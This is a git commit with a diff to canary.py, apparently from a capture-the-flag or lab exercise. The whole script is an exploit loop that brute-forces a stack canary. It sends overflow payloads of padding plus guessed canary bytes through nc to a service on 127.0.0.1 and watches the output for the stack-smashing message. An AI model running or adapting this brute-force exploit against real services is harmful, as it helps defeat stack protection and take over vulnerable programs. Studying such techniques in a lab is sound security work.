c50a04b3117799e9b7de9c90c2549199ad0047d4
ChoKyuWon <yyj10137@gmail.com>
2019-09-26 14:40:18 +0900

    fix

--- canary.py
+++ canary.py
@@ -4,11 +4,10 @@ import os
 import math
 from time import sleep
 
-canary = b'aaaaaaaaaa\x00+\xfd~\x0f\xf1%'
+canary = b'\x00'
 tmp = 0
 while True:
-    #payload = b'a'*10 + canary + (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
-    payload = b'aaaaaaaaaa\x00+\xfd~\x0f\xf1%'
+    payload = b'a'*10 + canary + (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
     p = subprocess.Popen(['nc','127.0.0.1','12345'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
     output = p.communicate(input=payload)[0]
     if b'smash' not in output:
